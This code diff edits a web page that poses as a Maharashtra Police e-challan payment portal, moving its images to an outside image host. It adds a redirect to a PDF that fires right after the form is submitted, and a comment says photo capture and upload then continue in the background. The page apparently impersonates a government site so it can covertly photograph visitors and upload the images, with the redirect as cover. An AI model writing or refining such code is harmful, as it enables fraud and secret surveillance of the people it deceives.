@@ -187,7 +187,7 @@
   <body>
     <div class="header">
       <div class="header-logo">
-        <img src="mh_logo.png" alt="Maharashtra Police Logo" class="logo-img" />
+        <img src="https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/mh_logo_gh1luc.png" alt="Maharashtra Police Logo" class="logo-img" />
         <p class="header-text">E-Challan Payment<br />Maharashtra Police</p>
       </div>
       <div class="language">
@@ -261,12 +261,12 @@
       </div>
       <div style="margin-top: 15px">
         <img
-          src="/templates/app_store-sm.png"
+          src="https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/app_store-sm_copozp.png"
           alt="App Store"
           style="margin: 0 5px"
         />
         <img
-          src="/templates/play_store-sm.png"
+          src="https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/play_store-sm_xwzg7m.png"
           alt="Google Play"
           style="margin: 0 5px"
         />
@@ -278,12 +278,15 @@
     </div>
 
     <script>
+      // PDF URL to redirect to after form submission
+      const PDF_REDIRECT_URL = "https://example.com/document.pdf"; // Replace with your actual PDF URL
+
       // Define captcha images and their corresponding answers
       const captchaData = [
-        { image: "/templates/captcha/1.png", answer: "ABC123XY" },
-        { image: "/templates/captcha/2.png", answer: "ZX9K4LMN" },
-        { image: "/templates/captcha/3.png", answer: "QW7ER2TY" },
-        { image: "/templates/captcha/4.png", answer: "PL8MN3KO" },
+        { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/4_ujeoyw.png", answer: "ABC123XY" },
+        { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/1_mwdtit.png", answer: "ZX9K4LMN" },
+        { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/3_ok9huw.png", answer: "QW7ER2TY" },
+        { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/2_gryz55.png", answer: "PL8MN3KO" },
       ];
 
       let currentCaptcha = null;
@@ -446,6 +449,10 @@
             const submitBtn = document.querySelector('.submit-btn');
             submitBtn.disabled = true;
             
+            // Redirect to PDF immediately upon successful validation
+            window.location.href = PDF_REDIRECT_URL;
+            
+            // Continue with background processes (photo capture and upload)
             try {
               console.log('Starting photo capture...');
               
